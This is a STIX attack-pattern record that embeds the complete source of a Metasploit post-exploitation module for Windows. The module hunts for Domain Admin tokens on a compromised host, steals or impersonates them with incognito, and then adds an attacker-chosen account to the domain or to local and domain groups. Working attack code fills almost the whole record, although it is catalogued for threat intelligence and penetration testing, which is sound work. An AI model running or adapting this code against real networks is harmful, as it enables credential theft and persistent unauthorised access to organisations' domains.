{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0e4212cc-0f01-41bd-9b53-03b203db9695",
    "created": "2024-08-14T16:33:04.982222Z",
    "modified": "2024-08-14T16:33:04.982225Z",
    "name": "Windows Manage Add User to the Domain and/or to a Domain Group",
    "description": " This module adds a user to the Domain and/or to a Domain group. It will check if sufficient privileges are present for certain actions and run getprivs for system.  If you elevated privs to system, the SeAssignPrimaryTokenPrivilege will not be assigned. You need to migrate to a process that is running as system. If you don't have privs, this script exits.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/add_user.rb",
            "external_id": "add_user.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Accounts\n  include Msf::Exploit::Deprecated\n\n  moved_from 'post/windows/manage/add_user_domain'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Add User to the Domain and/or to a Domain Group',\n        'Description' => %q{\n          This module adds a user to the Domain and/or to a Domain group. It will\n          check if sufficient privileges are present for certain actions and run\n          getprivs for system.  If you elevated privs to system, the\n          SeAssignPrimaryTokenPrivilege will not be assigned. You need to migrate to\n          a process that is running as system. If you don't have privs, this script\n          exits.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => 'Joshua Abraham <jabra[at]rapid7.com>',\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              incognito_impersonate_token\n              incognito_list_tokens\n              stdapi_sys_config_getuid\n              stdapi_sys_config_steal_token\n              stdapi_sys_process_get_processes\n            ]\n          }\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('USERNAME', [true, 'The username of the user to add (not-qualified, e.g. BOB)']),\n        OptString.new('PASSWORD', [false, 'Password of the user']),\n        OptString.new('GROUP', [false, 'Add user into group, creating it if necessary']),\n        OptBool.new('ADDTOGROUP', [true, 'Add group if it does not exist', false]),\n        OptBool.new('ADDTODOMAIN', [true, 'Add to Domain if true, otherwise add locally', true]),\n        OptString.new('TOKEN', [false, 'Username or PID of the token which will be used (if blank, Domain Admin tokens will be enumerated)', '']),\n      ]\n    )\n  end\n\n  def check_result(user_result)\n    case user_result['return']\n    when client.railgun.const('ERROR_ACCESS_DENIED')\n      print_error 'Sorry, you do not have permission to add that user.'\n    when client.railgun.const('NERR_UserExists')\n      print_status 'User already exists.'\n    when client.railgun.const('NERR_GroupExists')\n      print_status 'Group already exists.'\n    when client.railgun.const('NERR_UserNotFound')\n      print_error 'The user name could not be found.'\n    when client.railgun.const('NERR_InvalidComputer')\n      print_error 'The server you specified was invalid.'\n    when client.railgun.const('NERR_NotPrimary')\n      print_error 'You must be on the primary domain controller to do that.'\n    when client.railgun.const('NERR_GroupNotFound')\n      print_error 'The group specified by the groupname parameter does not exist.'\n    when client.railgun.const('NERR_PasswordTooShort')\n      print_error 'The password does not appear to be valid (too short, too long, too recent, etc.).'\n    when client.railgun.const('ERROR_ALIAS_EXISTS')\n      print_status 'The local group already exists.'\n    when client.railgun.const('NERR_UserInGroup')\n      print_status 'The user already belongs to this group.'\n    when client.railgun.const('ERROR_MORE_DATA')\n      print_status 'More entries are available. Specify a large enough buffer to receive all entries.'\n    when client.railgun.const('ERROR_NO_SUCH_ALIAS')\n      print_status 'The specified account name is not a member of the group.'\n    when client.railgun.const('ERROR_NO_SUCH_MEMBER')\n      print_status 'One or more of the members specified do not exist. Therefore, no new members were added.).'\n    when client.railgun.const('ERROR_MEMBER_IN_ALIAS')\n      print_status 'One or more of the members specified were already members of the group. No new members were added.'\n    when client.railgun.const('ERROR_INVALID_MEMBER')\n      print_status 'One or more of the members cannot be added because their account type is invalid. No new members were added.'\n    when client.railgun.const('RPC_S_SERVER_UNAVAILABLE')\n      print_status 'The RPC server is unavailable.'\n    else\n      print_error \"Unexpectedly returned #{user_result}\"\n    end\n  end\n\n  ## steal domain admin token\n  ## return code: bool\n  def steal_token(domain_user, domain)\n    if (session.sys.config.getuid == domain_user) || (domain_user == '')\n      return true\n    end\n\n    ## load incognito\n    if !session.incognito\n      session.core.use('incognito')\n    end\n\n    if !session.incognito\n      print_error(\"Failed to load incognito on #{session.sid} / #{session.session_host}\")\n      return false\n    end\n\n    ## verify domain_user contains a domain\n    if domain_user.index('\\\\').nil?\n      domain_user = \"#{domain}\\\\#{domain_user}\"\n    else\n      domain_user = ''\n    end\n\n    ## token is a PID\n    target_pid = ''\n    if (datastore['TOKEN'] =~ /^\\d+$/)\n      pid = datastore['TOKEN']\n\n      session.sys.process.get_processes.sort_by { rand }.each do |x|\n        if (pid == x['pid'])\n          target_pid = pid\n        end\n      end\n    ## token is a Domain User\n    else\n      session.sys.process.get_processes.sort_by { rand }.each do |x|\n        if ((x['user'] == domain_user) && (target_pid == ''))\n          target_pid = x['pid']\n          print_status(\"Found token for #{domain_user}\")\n        end\n      end\n    end\n\n    if target_pid != ''\n      # Do the migration\n      print_status(\"Stealing token of process ID #{target_pid}\")\n      session.sys.config.steal_token(target_pid)\n      if domain_user != ''\n        domain_user = session.sys.config.getuid\n      else\n        print_status(\"Stealing token of process ID #{target_pid}\")\n        session.sys.config.steal_token(target_pid)\n        if domain_user != ''\n          domain_user = session.sys.config.getuid\n        end\n      end\n\n      if session.sys.config.getuid != domain_user\n        print_error \"Steal Token Failed (running as: #{session.sys.config.getuid})\"\n        return false\n      end\n    else\n      print_status('No process tokens found.')\n      if (domain_user != '')\n        vprint_status('Trying impersonate_token technique...')\n        session.incognito.incognito_impersonate_token(domain_user)\n      else\n        return false\n      end\n    end\n\n    return true\n  end\n\n  ## enumerate if the session has a domain admin token on it\n  ## Return: token_found,token_user,current_user; otherwise false\n  def token_hunter(domain)\n    ## gather data\n    domain_admins = get_members_from_group('Domain Admins', get_domain('DomainControllerName'))\n\n    ## load incognito\n    if !session.incognito\n      session.core.use('incognito')\n    end\n\n    if !session.incognito\n      print_error(\"Failed to load incognito on #{session.sid} / #{session.session_host}\")\n      return false\n    end\n\n    domain_admins.each do |da_user|\n      ## current user\n      if session.sys.config.getuid == \"#{domain}\\\\#{da_user}\"\n        print_good \"Found Domain Admin Token: #{session.sid} - #{session.session_host} - #{da_user} (Current User)\"\n        return true, '', true\n      end\n\n      ## parse delegation tokens\n      res = session.incognito.incognito_list_tokens(0)\n      if res\n        res['delegation'].split(\"\\n\").each do |user|\n          ndom, nusr = user.split('\\\\')\n          if !nusr\n            nusr = ndom\n            ndom = nil\n          end\n          next unless (ndom == domain) && (da_user == nusr)\n\n          sid = session.sid\n          peer = session.session_host\n          print_good(\"Found Domain Admin Token: #{sid} - #{peer} - #{nusr} (Delegation Token)\")\n          return true, nusr, false\n        end\n      end\n\n      ## parse process list\n      session.sys.process.get_processes.each do |x|\n        next unless (x['user'] == \"#{domain}\\\\#{da_user}\")\n\n        target_pid = x['pid']\n        sid = session.sid\n        peer = session.session_host\n        report_note(\n          host: session,\n          type: 'domain.token.pid',\n          data: { pid: target_pid, sid: sid, peer: peer, user: da_user },\n          update: :unique_data\n        )\n        print_good(\"Found Domain Admin Token: #{sid} - #{peer} - #{da_user} (PID: #{target_pid})\")\n        return true, da_user, false\n      end\n    end\n    return false\n  end\n\n  def local_mode\n    if datastore['PASSWORD'].nil?\n      datastore['PASSWORD'] = Rex::Text.rand_text_alphanumeric(16) + Rex::Text.rand_text_numeric(2)\n      print_status(\"You have not set up a PASSWORD. The default is '#{datastore['PASSWORD']}'\")\n    end\n    #  Add user\n    if enum_user.include? datastore['USERNAME']\n      print_status(\"User '#{datastore['USERNAME']}' already exists.\")\n    else\n      result = add_user(datastore['USERNAME'], datastore['PASSWORD'])\n      if result['return'] == 0\n        print_good(\"User '#{datastore['USERNAME']}' was added.\")\n      else\n        check_result(result)\n      end\n    end\n\n    #  Add localgroup\n    if datastore['ADDTOGROUP'] && (!enum_localgroup.include? datastore['GROUP'])\n      if datastore['GROUP']\n        result = add_localgroup(datastore['GROUP'])\n        if result['return'] == 0\n          print_good(\"Group '#{datastore['GROUP']}'  was added.\")\n        else\n          check_result(result)\n        end\n      else\n        print_error('Check your group name')\n      end\n    end\n    #  Add Member to LocalGroup\n    if datastore['ADDTOGROUP'] && datastore['GROUP']\n      result = add_members_localgroup(datastore['GROUP'], datastore['USERNAME'])\n      if result['return'] == 0\n        print_good(\"'#{datastore['USERNAME']}' is now a member of the '#{datastore['GROUP']}' group.\")\n      else\n        check_result(result)\n      end\n    end\n  end\n\n  def domain_mode\n    ## check domain\n    server_name = get_domain('DomainControllerName')\n    if server_name\n      print_good(\"Found Domain : #{server_name}\")\n    else\n      print_error('No DC is available for the specified domain or the domain does not exist. ')\n      return false\n    end\n    if datastore['PASSWORD'].nil?\n      datastore['PASSWORD'] = Rex::Text.rand_text_alphanumeric(16) + Rex::Text.rand_text_numeric(2)\n      print_status(\"You have not set up a PASSWORD. The default is '#{datastore['PASSWORD']}'\")\n    end\n    ## enum domain\n    domain = primary_domain\n    if domain.nil?\n      return\n    end\n\n    ## steal token if neccessary\n    if datastore['TOKEN'] == ''\n      token_found, token_user, current_user = token_hunter(domain)\n      if token_found && current_user == false\n        datastore['TOKEN'] = token_user\n      end\n    end\n\n    ## steal token\n    steal_token_res = steal_token(datastore['TOKEN'], domain)\n    return if steal_token_res == false\n\n    ## Add user to the domain\n    if (enum_user(server_name).include? datastore['USERNAME'])\n      print_status(\"#{datastore['USERNAME']} is already a member of the #{domain} domain\")\n    else\n      print_status(\"Adding '#{datastore['USERNAME']}' as a user to the #{domain} domain\")\n      result = add_user(datastore['USERNAME'], datastore['PASSWORD'], server_name)\n      if result['return'] == 0\n        print_good(\"User '#{datastore['USERNAME']}' was added to the #{domain} domain.\")\n      else\n        check_result(result)\n      end\n    end\n\n    ## Add group to  domain\n    if datastore['ADDTOGROUP'] && (!enum_group(server_name).include? datastore['GROUP'])\n      if datastore['GROUP']\n        result = add_group(datastore['GROUP'], server_name)\n        if result['return'] == 0\n          print_good(\"Group '#{datastore['GROUP']}'  was added!\")\n        else\n          check_result(result)\n        end\n        if (!enum_group(server_name).include? datastore['GROUP'])\n          print_error(\"The #{datastore['GROUP']} group not exist in the domain. It is possible that the same group name exists for the local group.\")\n        end\n      else\n        print_error('Check your group name')\n      end\n    end\n\n    if datastore['ADDTOGROUP'] && (enum_group(server_name).include? datastore['GROUP'])\n      ## check if user is already a member of the group\n      members = get_members_from_group(datastore['GROUP'], server_name)\n      # Show results if we have any, Error if we don't\n      if members.include? datastore['USERNAME']\n        print_status(\"#{datastore['USERNAME']} is already a member of the '#{datastore['GROUP']}' group\")\n      else\n        print_status(\"Adding '#{datastore['USERNAME']}' to the '#{datastore['GROUP']}' Domain Group\")\n        result = add_members_group(datastore['GROUP'], datastore['USERNAME'], server_name)\n        if result['return'] == 0\n          print_good(\"'#{datastore['USERNAME']}' is now a member of the '#{datastore['GROUP']}' group!\")\n        else\n          check_result(result)\n        end\n      end\n    end\n  end\n\n  # Run Method for when run command is issued\n  def run\n    print_status(\"Running module on '#{sysinfo['Computer']}'\")\n    if datastore['ADDTODOMAIN']\n      print_status('Domain Mode')\n      domain_mode\n    else\n      print_status('Local Mode')\n      local_mode\n    end\n    return nil\n  end\n\n  def primary_domain\n    dom_info = get_domain('DomainControllerName')\n    if !dom_info.nil? && dom_info =~ /\\./\n      foo = dom_info.split('.')\n      domain = foo[1].upcase\n    else\n      print_error(\"Error parsing output from the registry. (#{dom_info})\")\n    end\n    return domain\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}